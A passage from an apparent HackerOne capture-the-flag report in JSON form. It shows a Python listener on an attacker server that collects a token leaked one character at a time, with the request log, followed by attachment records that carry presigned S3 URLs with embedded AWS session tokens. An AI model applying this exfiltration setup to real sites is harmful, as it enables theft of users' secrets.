self.send_response(200)\n            self.send_header(\"Access-Control-Allow-Origin\", \"*\")\n            self.end_headers()\n\n\nhttpd = HTTPServer(('0.0.0.0', 9999), SimpleHTTPRequestHandler)\nhttpd.socket = ssl.wrap_socket (httpd.socket, \n        keyfile=\"[redacted]\", \n        certfile=\"[redacted]\", server_side=True)\nhttpd.serve_forever()\n```\n\nAfter running the Python script and pointing the URL in the request to `https://[attackerserver]:9999/css`, the log output of the script looked as follows:\n\n```bash\n$ python3 httpserver.py \n3.21.98.146 - - [05/Jun/2020 21:05:12] \"GET /css HTTP/1.1\" 200 -\n3.21.98.146 - - [05/Jun/2020 21:05:12] \"GET /log_7/S HTTP/1.1\" 200 -\n3.21.98.146 - - [05/Jun/2020 21:05:12] \"GET /log_1/t HTTP/1.1\" 200 -\n3.21.98.146 - - [05/Jun/2020 21:05:12] \"GET /log_2/K HTTP/1.1\" 200 -\n3.21.98.146 - - [05/Jun/2020 21:05:13] \"GET /log_3/s HTTP/1.1\" 200 -\n3.21.98.146 - - [05/Jun/2020 21:05:13] \"GET /log_4/P HTTP/1.1\" 200 -\n3.21.98.146 - - [05/Jun/2020 21:05:13] \"GET /log_5/v HTTP/1.1\" 200 -\n3.21.98.146 - - [05/Jun/2020 21:05:13] \"GET /log_6/g HTTP/1.1\" 200 -\n```\n\nEntering `tKsPvgS` as token succeeded - finally, all bounties were paid and the flag got displayed:\n\n{F858483}\n\n## Impact\n\n.",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 858468,
      "file_name": "ctf-objective.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Hz7HCvhEHWwmL6QLobv8kqBQ?response-content-disposition=attachment%3B%20filename%3D%22ctf-objective.png%22%3B%20filename%2A%3DUTF-8%27%27ctf-objective.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=96279312697958d5ca093cf15794104d473b148cb0d2449e7e8f70923270f118",
      "file_size": 180671,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858471,
      "file_name": "2fa-password-structure.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vrPe3cTS67CKBKeape2E8Ydq?response-content-disposition=attachment%3B%20filename%3D%222fa-password-structure.png%22%3B%20filename%2A%3DUTF-8%27%272fa-password-structure.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=51719e34b297bfe818a74b95a978ee05c4ac084179090110e0e86bab9b0d5df5",
      "file_size": 22063,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858472,
      "file_name": "software-unauthorized.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ck6oW62wjR42e5V7bCQTJUeb?response-content-disposition=attachment%3B%20filename%3D%22software-unauthorized.png%22%3B%20filename%2A%3DUTF-8%27%27software-unauthorized.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=691ffb748ae7ea8cf2f738d68c227feaed81edb2def5e017b16533e38f3e7860",
      "file_size": 23377,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858473,
      "file_name": "android-partthree-token.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Z7YzmtHNuKRRDVF8xQnNVmcw?response-content-disposition=attachment%3B%20filename%3D%22android-partthree-token.png%22%3B%20filename%2A%3DUTF-8%27%27android-partthree-token.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a47186760c1a1abe9b166079460357d46fec77495eb290a436812b381e37f763",
      "file_size": 33889,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858474,
      "file_name": "android-partthree-codereview.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/F2HGwyF9QtfbE4DW32TfeW9C?response-content-disposition=attachment%3B%20filename%3D%22android-partthree-codereview.png%22%3B%20filename%2A%3DUTF-8%27%27android-partthree-codereview.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=233bfda7f40e3b6adaa3c34289d51d6bbc3ee018bf4dcf4208a672ebc0f803e6",
      "file_size": 10120,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858475,
      "file_name": "android-parttwo-header.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MyUu9qoH9gLWtnnzmNe66Trd?response-content-disposition=attachment%3B%20filename%3D%22android-parttwo-header.png%22%3B%20filename%2A%3DUTF-8%27%27android-parttwo-header.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6a3161f39c8ad7bc40ca6576bf54939fd6a5f3c97b225d7597a58e8defc45146",
      "file_size": 23871,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858476,
      "file_name": "android-parttwo-codereview.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/XYpdQVvWe9ykyitdEyke2ykL?response-content-disposition=attachment%3B%20filename%3D%22android-parttwo-codereview.png%22%3B%20filename%2A%3DUTF-8%27%27android-parttwo-codereview.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=34471d11c8ba5222ce81b4ea426b10d655e882b5bf26f23a2acad7820e3d423f",
      "file_size": 13981,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858477,
      "file_name": "sandra-allison.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hwK8E8fDTbg3FeaMn8pDRKRU?response-content-disposition=attachment%3B%20filename%3D%22sandra-allison.png%22%3B%20filename%2A%3DUTF-8%27%27sandra-allison.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134640Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=067f10a5eecf31fc505a445d4fae7f741a7b1d263851c2882dd071396e9d838e",
      "file_size": 373899,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 858479,
      "file_name": "admininterface.png",
